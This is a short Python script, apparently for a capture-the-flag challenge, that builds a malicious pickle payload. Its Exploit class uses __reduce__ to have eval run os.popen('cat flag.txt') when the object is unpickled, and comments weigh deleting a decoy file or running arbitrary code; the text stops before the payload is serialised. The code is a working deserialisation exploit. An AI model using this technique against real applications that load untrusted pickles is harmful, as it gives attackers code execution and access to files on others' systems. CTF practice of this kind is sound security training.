import pickle
import os
import sys

# TODO: Create a malicious pickle payload for the CTF
# Options:
# 1. Delete decoy.txt so flag.txt is read
# 2. Read flag.txt and print it
# 3. Execute arbitrary code that reveals flag

# Option 2: Directly reading flag.txt is most reliable
class Exploit:
    def __reduce__(self):
        # This will be executed when pickle.loads() is called
        # Use os.system or eval to read and output flag.txt
        cmd = "import os; print(os.popen('cat flag.txt').read())"
        return (eval, (cmd,))

# Create the malicious pickle
